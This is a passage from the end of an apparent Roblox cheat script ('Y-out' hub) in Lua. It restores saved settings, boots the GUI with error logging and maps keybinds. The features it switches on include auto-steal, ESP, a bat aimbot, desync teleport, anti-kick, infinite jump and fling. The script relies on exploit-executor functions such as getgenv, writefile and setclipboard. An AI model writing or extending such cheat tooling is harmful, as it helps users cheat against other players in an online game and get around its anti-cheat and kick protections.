                        paintFloatingBtn(btnFrame, on)
                        if autoBatV2SetVisual then autoBatV2SetVisual(on) end
                        if tpBatFloatingButton then
                            local tpFrame = tpBatFloatingButton:FindFirstChild("Frame")
                            if tpFrame then paintFloatingBtn(tpFrame, batDesyncTpEnabled) end
                        end
                        if batDesyncTpSetVisual then batDesyncTpSetVisual(batDesyncTpEnabled) end
                        task.defer(function() pcall(saveAllSettings) end)
                    elseif not uiLocked and hasMoved then
                        _G.__YoutBatV2Pos = {
                            XScale = btnFrame.Position.X.Scale,
                            XOffset = btnFrame.Position.X.Offset,
                            YScale = btnFrame.Position.Y.Scale,
                            YOffset = btnFrame.Position.Y.Offset
                        }
                        task.defer(function() pcall(saveAllSettings) end)
                    end
                    dragging = false; hasMoved = false
                end
            end
        end)
    
        _G.__YoutBatV2Button = panel
        _G.__YoutBatV2Frame = btnFrame
        paintFloatingBtn(btnFrame, autoBatV2Enabled)
        return panel
    end
    
    setBatCounterV2Visual = nil
    
    function updateUIFromLoaded()
        task.wait()
        if normalBox then normalBox.Text = tostring(NS) end
        if carryBox then carryBox.Text = tostring(CS) end
        if radInput then radInput.Text = tostring(CONFIG.STEAL_RANGE) end
        if laggerBox then laggerBox.Text = tostring(LAGGER_SPEED) end
        if lagger2Box then lagger2Box.Text = tostring(LAGGER_CARRY_SPEED) end
        if batSpeedBox then batSpeedBox.Text = tostring(BAT_AIMBOT_SPEED) end
        if uiScaleBox then uiScaleBox.Text = tostring(uiScaleValue) end
        if stealBarScaleBox then stealBarScaleBox.Text = tostring(stealBarScale) end
        if dropModeBtnRef then dropModeBtnRef.Text = dropMode == 1 and "Fling" or "Jump Drop" end
        if bodyLockRangeBox then bodyLockRangeBox.Text = tostring(bodyLockRange) end
        refreshSpeedModeLabel()
    
        for _, ref in ipairs(keyButtonRefs) do
            local entry = ref.entry
            local label = (entry.gp and entry.gp.Name) or (entry.kb and entry.kb.Name) or "None"
            ref.btn.Text = label
        end
    
        if savedProgressBarPos and pbFrame then
            pbFrame.Position = UDim2.new(savedProgressBarPos.XScale or 0.5, savedProgressBarPos.XOffset or -170, savedProgressBarPos.YScale or 0.80, savedProgressBarPos.YOffset or 0)
        end
    
        applyFloatingButtonScale()
    
        if uiLocked and setLockUIVisual then setLockUIVisual(true) end
    
        if antiRagdollMode == "v2" then
            if setAntiRagVisual then setAntiRagVisual(true) end
            startAntiRagdollV2()
        else
            if setAntiRagVisual then setAntiRagVisual(false) end
        end
    
        if antiDieEnabled then
            if setAntiDieVisual then setAntiDieVisual(true) end
            AntiDieModule.start()
        else
            if setAntiDieVisual then setAntiDieVisual(false) end
        end
    
        if antiFlingEnabled then
            if setAntiFlingVisual then setAntiFlingVisual(true) end
            startAntiFling()
        else
            if setAntiFlingVisual then setAntiFlingVisual(false) end
            stopAntiFling()
        end
    
        if infiniteJumpEnabled then
            if setInfiniteJumpVisual then setInfiniteJumpVisual(true) end
            InfiniteJump.start()
        else
            if setInfiniteJumpVisual then setInfiniteJumpVisual(false) end
            InfiniteJump.stop()
        end
    
        if CONFIG.AUTO_STEAL_ENABLED and setInstaGrab then setInstaGrab(true); pcall(startAutoSteal) end
    
        if medusaCounterEnabled then
            if setMedusaVisual then setMedusaVisual(true) end
            if LP.Character then setupMedusaCounter(LP.Character) end
        else
            if setMedusaVisual then setMedusaVisual(false) end
            stopMedusaCounter()
        end
    
        if batCounterEnabled and setBatCounterVisual then
            setBatCounterVisual(true)
            startBatCounter()
        end
        if ragdollTimerEnabled and setRagdollTimerVisual then
            setRagdollTimerVisual(true)
        end
        if unwalkEnabled and setUnwalkVisual then
            setUnwalkVisual(true)
            task.spawn(function() task.wait(0.5); startUnwalk() end)
        end
        if antiLagEnabled then
            if setAntiLagVisual then setAntiLagVisual(true) end
            enableAntiLag()
        else
            if setAntiLagVisual then setAntiLagVisual(false) end
            disableAntiLag()
        end
    
        if vividGraphicsEnabled then
            enableVividGraphics()
            if setVividVisual then setVividVisual(true) end
        else
            disableVividGraphics()
            if setVividVisual then setVividVisual(false) end
        end
    
        if batDesyncTpEnabled then
            if batDesyncTpSetVisual then batDesyncTpSetVisual(true) end
            if not batDesyncTpConn then startBatDesyncTp() end
            updateTpBatButtonWithAntiDie(true)
        else
            if batDesyncTpSetVisual then batDesyncTpSetVisual(false) end
            updateTpBatButtonWithAntiDie(false)
        end
    
        if autoBatV2Enabled then
            if autoBatEnabled then
                autoBatEnabled = false
                if autoBatSetVisual then autoBatSetVisual(false) end
                if mobSetAutoBat then mobSetAutoBat(false) end
            end
            if batDesyncTpEnabled then
                stopBatDesyncTp()
                if batDesyncTpSetVisual then batDesyncTpSetVisual(false) end
                updateTpBatButtonWithAntiDie(false)
            end
            if autoBatV2SetVisual then autoBatV2SetVisual(true) end
            enableBatV2()
        else
            if autoBatV2SetVisual then autoBatV2SetVisual(false) end
        end
        if _G.__YoutBatV2Frame then
            paintFloatingBtn(_G.__YoutBatV2Frame, autoBatV2Enabled)
        end
    
        if fovEnabled then
            enableCustomFov()
        end
        if setFovVisual then setFovVisual(fovEnabled) end
        if fovSliderSet then fovSliderSet(fovValue) end
    
        if stretchEnabled then
            enableStretch()
            if _G.stretchToggleSetter then _G.stretchToggleSetter(true) end
        else
            if _G.stretchToggleSetter then _G.stretchToggleSetter(false) end
        end
    
        if mobSetAutoBat then mobSetAutoBat(autoBatEnabled) end
        if mobSetAutoLeft then mobSetAutoLeft(autoLeftEnabled) end
        if mobSetAutoRight then mobSetAutoRight(autoRightEnabled) end
        if mobSetCarry then mobSetCarry(speedMode) end
        if mobSetLagger1 then mobSetLagger1(laggerToggled) end
        if mobSetLagger2 then mobSetLagger2(laggerCarryToggled) end
    
        if bodyLockEnabled and bodyLockSetVisual then
            if _blSuppressCount == 0 then
                bodyLockSetVisual(true)
                startBodyLock()
            else
                bodyLockSetVisual(false)
            end
        end
    
        if setSafeModeVisual then setSafeModeVisual(antiKickEnabled) end
        if CleanHubShowE01WarningSetVisual then CleanHubShowE01WarningSetVisual(CleanHubShowE01Warning) end
        if CleanHubAutoTPDownSetVisual then CleanHubAutoTPDownSetVisual(CleanHubAutoTPDown) end
        if CleanHubAutoTPDownHeightBox then CleanHubAutoTPDownHeightBox.Text = tostring(CleanHubAutoTPDownHeight) end
        if mirrorTPDownSetVisual then mirrorTPDownSetVisual(mirrorTPDownEnabled) end
        if setESPVIsual then setESPVIsual(espEnabled) end
        if espEnabled then toggleESP(true) end
    
        if katanaSkinEnabled then
            task.defer(function()
                pcall(function() katanaSkinController.ApplySkin("KATANA") end)
            end)
        end
    
        updateProgressBarVisibility()
        startEnemySpeed()
    
        toggleLockUI(uiLocked)
    
        pcall(function() applyOutfitByIndex(currentOutfitIndex) end)
        if outfitSelectorLabel then outfitSelectorLabel.Text = OUTFITS[currentOutfitIndex].label end
    
        -- Restore active tab
        if activeTab and tabPages and tabPages[activeTab] then
            for name, page in pairs(tabPages) do
                page.Visible = (name == activeTab)
            end
            for name, btn in pairs(tabButtons) do
                if name == activeTab then
                    local tabColor = ({SPEED = Color3.fromRGB(220, 50, 50), COMBAT = Color3.fromRGB(50, 120, 220), KEYBIND = Color3.fromRGB(150, 60, 200)})[name] or getThemeColor()
                    btn.BackgroundColor3 = tabColor
                    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
                    local st = btn:FindFirstChildOfClass("UIStroke")
                    if st then st.Color = tabColor; st.Transparency = 0.1 end
                else
                    btn.BackgroundColor3 = Color3.fromRGB(25, 25, 32)
                    btn.TextColor3 = Color3.fromRGB(180, 180, 195)
                    local st = btn:FindFirstChildOfClass("UIStroke")
                    if st then st.Color = Color3.fromRGB(60, 60, 70); st.Transparency = 0.5 end
                end
            end
        end
    end
    
    -- =====================================================================
    -- ARRANQUE BLINDADO
    -- =====================================================================
    local _bootErrors = {}
    
    local function _bootSection(name, fn)
        print("[Y-out Boot] Iniciando:", name)
        local ok, err = pcall(fn)
        if not ok then
            print("[Y-out Boot] FALLÃ“:", name, tostring(err))
            table.insert(_bootErrors, {name = name, err = tostring(err)})
            warn("[Y-out Boot] Error en '" .. name .. "': " .. tostring(err))
        else
            print("[Y-out Boot] OK:", name)
        end
        return ok
    end
    
    _bootSection("buildGui", function()
        buildGui()
    end)
    
    if gui and main then
        _bootSection("loadAllSettings", function()
            if loadAllSettings() then
                updateUIFromLoaded()
            end
        end)
    
        _bootSection("createMobilePanel", function()
            MobilePanel = createMobilePanel()
        end)
    
        _bootSection("createTpBatFloatingButton", function()
            tpBatFloatingButton = createTpBatFloatingButton()
        end)
    
        _bootSection("createBatV2FloatingButton", function()
            _G.__YoutBatV2Panel = createBatV2FloatingButton()
        end)
    
        if hideButtonsEnabled then
            _bootSection("applyHideButtons", function()
                applyHideButtons(true)
                if setHideButtonsVisual then setHideButtonsVisual(true) end
            end)
        end
    
        _bootSection("localizeYoutInterface", function()
            if gui then localizeYoutInterface(gui) end
            if MobilePanel then localizeYoutInterface(MobilePanel) end
            if tpBatFloatingButton then localizeYoutInterface(tpBatFloatingButton) end
            if _G.__YoutBatV2Panel then localizeYoutInterface(_G.__YoutBatV2Panel) end
        end)
    
        if LP.Character then
            task.spawn(function()
                task.wait(0.1)
                if waitForCharReady(LP.Character, 5) then
                    pcall(function() captureOriginalAppearance(LP.Character) end)
                    pcall(function() setupMovementAndIndicators(LP.Character) end)
                    if currentAnimPack ~= "Off" then
                        pcall(function() startAnimPack(currentAnimPack) end)
                    end
                    pcall(function() applyOutfitByIndex(currentOutfitIndex) end)
                end
            end)
        end
    
        if #_bootErrors > 0 then
            task.defer(function()
                pcall(function()
                    local env = (getgenv and getgenv()) or _G
                    local writeFn = env.writefile or (syn and syn.writefile)
                    if type(writeFn) == "function" then
                        local log = "[Y-out Boot Errors] " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n"
                        for _, e in ipairs(_bootErrors) do
                            log = log .. e.name .. ": " .. e.err .. "\n"
                        end
                        pcall(writeFn, "Yout_boot_errors.txt", log)
                        warn("[Y-out] Errores escritos a Yout_boot_errors.txt")
                    end
                end)
            end)
    
            task.defer(function()
                pcall(function()
                    local errGui = Instance.new("ScreenGui")
                    errGui.Name = "YoutBootErrors"
                    errGui.ResetOnSpawn = false
                    errGui.DisplayOrder = 999
                    local okCg, cg = pcall(function() return game:GetService("CoreGui") end)
                    if okCg and cg then
                        pcall(function() errGui.Parent = cg end)
                    end
                    if not errGui.Parent then errGui.Parent = LP:WaitForChild("PlayerGui") end
    
                    local frame = Instance.new("Frame", errGui)
                    frame.Size = UDim2.new(0, 460, 0, 60 + #_bootErrors * 22)
                    frame.Position = UDim2.new(0, 10, 1, -80 - #_bootErrors * 22)
                    frame.BackgroundColor3 = Color3.fromRGB(40, 10, 15)
                    frame.BorderSizePixel = 0
                    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
                    local stroke = Instance.new("UIStroke", frame)
                    stroke.Color = Color3.fromRGB(255, 80, 90)
                    stroke.Thickness = 1.5
    
                    local title = Instance.new("TextLabel", frame)
                    title.Size = UDim2.new(1, -20, 0, 24)
                    title.Position = UDim2.new(0, 10, 0, 8)
                    title.BackgroundTransparency = 1
                    title.Text = "âš    Y-out: " .. #_bootErrors .. " secciÃ³n(es) fallaron"
                    title.TextColor3 = Color3.fromRGB(255, 100, 110)
                    title.Font = Enum.Font.GothamBold
                    title.TextSize = 13
                    title.TextXAlignment = Enum.TextXAlignment.Left
    
                    for i, e in ipairs(_bootErrors) do
                        local lbl = Instance.new("TextLabel", frame)
                        lbl.Size = UDim2.new(1, -20, 0, 18)
                        lbl.Position = UDim2.new(0, 10, 0, 34 + (i - 1) * 20)
                        lbl.BackgroundTransparency = 1
                        lbl.Text = "â€¢ " .. e.name .. ": " .. e.err:sub(1, 110)
                        lbl.TextColor3 = Color3.fromRGB(255, 180, 180)
                        lbl.Font = Enum.Font.Code
                        lbl.TextSize = 10
                        lbl.TextXAlignment = Enum.TextXAlignment.Left
                        lbl.TextTruncate = Enum.TextTruncate.AtEnd
                    end
    
                    local copyBtn = Instance.new("TextButton", frame)
                    copyBtn.Size = UDim2.new(0, 100, 0, 22)
                    copyBtn.Position = UDim2.new(0, 10, 1, -30)
                    copyBtn.BackgroundColor3 = Color3.fromRGB(80, 20, 30)
                    copyBtn.Text = "COPIAR LOG"
                    copyBtn.TextColor3 = Color3.fromRGB(255, 200, 200)
                    copyBtn.Font = Enum.Font.GothamBold
                    copyBtn.TextSize = 11
                    copyBtn.BorderSizePixel = 0
                    Instance.new("UICorner", copyBtn).CornerRadius = UDim.new(0, 6)
                    copyBtn.MouseButton1Click:Connect(function()
                        local buf = ""
                        for _, e in ipairs(_bootErrors) do
                            buf = buf .. e.name .. ": " .. e.err .. "\n"
                        end
                        pcall(function()
                            if setclipboard then setclipboard(buf) end
                        end)
                        copyBtn.Text = "Â¡COPIADO!"
                        task.delay(1.2, function() copyBtn.Text = "COPIAR LOG" end)
                    end)
    
                    local closeBtn = Instance.new("TextButton", frame)
                    closeBtn.Size = UDim2.new(0, 60, 0, 22)
                    closeBtn.Position = UDim2.new(1, -70, 1, -30)
                    closeBtn.BackgroundColor3 = Color3.fromRGB(80, 20, 30)
                    closeBtn.Text = "CERRAR"
                    closeBtn.TextColor3 = Color3.fromRGB(255, 200, 200)
                    closeBtn.Font = Enum.Font.GothamBold
                    closeBtn.TextSize = 11
                    closeBtn.BorderSizePixel = 0
                    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
                    closeBtn.MouseButton1Click:Connect(function()
                        pcall(function() errGui:Destroy() end)
                    end)
    
                    task.delay(60, function()
                        pcall(function() errGui:Destroy() end)
                    end)
                end)
            end)
        end
    else
        warn("[Y-out Boot] Fatal: buildGui fallÃ³. El script no puede continuar.")
    end
    
    if LP and LP.CharacterAdded then
        pcall(function()
            local _respawnQueue = 0
            LP.CharacterAdded:Connect(function(char)
                pcall(function()
                    _respawnQueue = _respawnQueue + 1
                    local myId = _respawnQueue
    
                    if stealConnection then stealConnection:Disconnect(); stealConnection = nil end
                    isStealing = false
                    if stopAutoLeft then stopAutoLeft() end
                    if stopAutoRight then stopAutoRight() end
                    if stopBatCounter then stopBatCounter() end
                    if stopMedusaCounter then stopMedusaCounter() end
                    if not isActive and stopUnwalk then stopUnwalk() end
                    if stopDropBrainrot then stopDropBrainrot() end
                    if autoBatEnabled and disableAutoBat then disableAutoBat() end
                    if batDesyncTpEnabled and stopBatDesyncTp then stopBatDesyncTp() end
                    if autoBatV2Enabled and disableBatV2 then disableBatV2() end
                    if bodyLockEnabled and stopBodyLock then stopBodyLock() end
    
                    local deadline = _tick() + 5
                    while (not char.Parent) or (not char:FindFirstChild("HumanoidRootPart")) or (not char:FindFirstChildOfClass("Humanoid")) do
                        if _tick() > deadline then return end
                        if myId ~= _respawnQueue then return end
                        task.wait(0.05)
                    end
    
                    _hookedVelParts = {}
                    local _hrpRespawn = _setupVelChecked(char)
                    _hookVelHRP(_hrpRespawn)
    
                    if not _originalAppearance then task.defer(function() captureOriginalAppearance(char) end) end
                    if setupMovementAndIndicators then setupMovementAndIndicators(char) end
                    if antiRagdollMode == "v2" then startAntiRagdollV2() end
                    if antiFlingEnabled then startAntiFling() end
                    if infiniteJumpEnabled then InfiniteJump.start() end
                    if AntiDieModule.enabled then task.defer(function() activateOnCharacter(char) end) end
                    if CONFIG.AUTO_STEAL_ENABLED then pcall(startAutoSteal) end
                    if batDesyncTpEnabled then task.defer(startBatDesyncTp) end
                    if autoBatV2Enabled then task.defer(enableBatV2) end
                    if bodyLockEnabled and _blSuppressCount == 0 then startBodyLock() end
    
                    if medusaCounterEnabled then
                        setupMedusaCounter(char)
                        if setMedusaVisual then setMedusaVisual(true) end
                    else
                        stopMedusaCounter()
                        if setMedusaVisual then setMedusaVisual(false) end
                    end
    
                    if batCounterEnabled then startBatCounter() end
                    if ragdollTimerEnabled and setRagdollTimerVisual then setRagdollTimerVisual(true) end
                    if unwalkEnabled and not isActive then startUnwalk() end
                    if currentAnimPack ~= "Off" then task.wait(0.3); startAnimPack(currentAnimPack) end
    
                    updateProgressBarVisibility()
                    refreshSpeedModeLabel()
    
                    pcall(function() applyOutfitByIndex(currentOutfitIndex) end)
                    if outfitSelectorLabel then outfitSelectorLabel.Text = OUTFITS[currentOutfitIndex].label end
    
                    if katanaSkinEnabled then
                        task.wait(1)
                        pcall(function() katanaSkinController.ApplySkin("KATANA") end)
                    end
                end)
            end)
        end)
    end
    
    local lastLaggerToggle = 0
    local LAGGER_COOLDOWN = 0.3
    
    UIS.InputBegan:Connect(function(input, gpe)
        if _anyKeyListening then return end
        if input.UserInputType == Enum.UserInputType.Keyboard then
            if gpe or UIS:GetFocusedTextBox() then return end
        elseif not isGamepadInput(input) then
            return
        end
        if not isBindableInput(input) then return end
    
        local kc = input.KeyCode
        if not kc then return end
    
        if kbMatch(KB.LaggerMode, kc) then
            if _tick() - lastLaggerToggle >= LAGGER_COOLDOWN then
                lastLaggerToggle = _tick()
                toggleLaggerCycle()
            end
            return
        end
        if kbMatch(KB.CarryToggle, kc) then toggleCarryMode(); return end
        if kbMatch(KB.DropBrainrot, kc) then
            if not dropActive then
                if dropBrainrotSetVisual then dropBrainrotSetVisual(true) end
                executeDropWithToggle(dropBrainrotSetVisual)
            end
            return
        end
        if kbMatch(KB.AutoLeft, kc) then
            autoLeftEnabled = not autoLeftEnabled
            if autoLeftEnabled then startAutoLeft() else stopAutoLeft() end
            if autoLeftSetVisual then autoLeftSetVisual(autoLeftEnabled) end
            if mobSetAutoLeft then mobSetAutoLeft(autoLeftEnabled) end
            return
        end
        if kbMatch(KB.AutoRight, kc) then
            autoRightEnabled = not autoRightEnabled
            if autoRightEnabled then startAutoRight() else stopAutoRight() end
            if autoRightSetVisual then autoRightSetVisual(autoRightEnabled) end
            if mobSetAutoRight then mobSetAutoRight(autoRightEnabled) end
            return
        end
        if kbMatch(KB.AutoBat, kc) then
            if not autoBatEnabled then
                enableAutoBat()
                if autoBatSetVisual then autoBatSetVisual(true) end
                if mobSetAutoBat then mobSetAutoBat(true) end
            else
                disableAutoBat()
                if autoBatSetVisual then autoBatSetVisual(false) end
                if mobSetAutoBat then mobSetAutoBat(false) end
            end
            return
        end
        if kbMatch(KB.TPBat, kc) then
            toggleBatDesyncTp()
            if batDesyncTpSetVisual then batDesyncTpSetVisual(batDesyncTpEnabled) end
            if tpBatFloatingButton then
                local btnFrame = tpBatFloatingButton:FindFirstChild("Frame")
                if btnFrame then paintFloatingBtn(btnFrame, batDesyncTpEnabled) end
            end
            if _G.__YoutBatV2Frame then
                paintFloatingBtn(_G.__YoutBatV2Frame, autoBatV2Enabled)
            end
            if autoBatV2SetVisual then autoBatV2SetVisual(autoBatV2Enabled) end
            return
        end
        if kbMatch(KB.BatV2, kc) then
            toggleBatV2()
            if autoBatV2SetVisual then autoBatV2SetVisual(autoBatV2Enabled) end
            if _G.__YoutBatV2Frame then
                paintFloatingBtn(_G.__YoutBatV2Frame, autoBatV2Enabled)
            end
            if tpBatFloatingButton then
                local btnFrame = tpBatFloatingButton:FindFirstChild("Frame")
                if btnFrame then paintFloatingBtn(btnFrame, batDesyncTpEnabled) end
            end
            if batDesyncTpSetVisual then batDesyncTpSetVisual(batDesyncTpEnabled) end
            saveAllSettings()
            return
        end
        if kbMatch(KB.TPFloor, kc) then
            teleportDown()
            return
        end
        if kbMatch(KB.GuiHide, kc) then
            if main then
                if main.Visible then hideGui() else showGui() end
            end
            return
        end
    end)
end)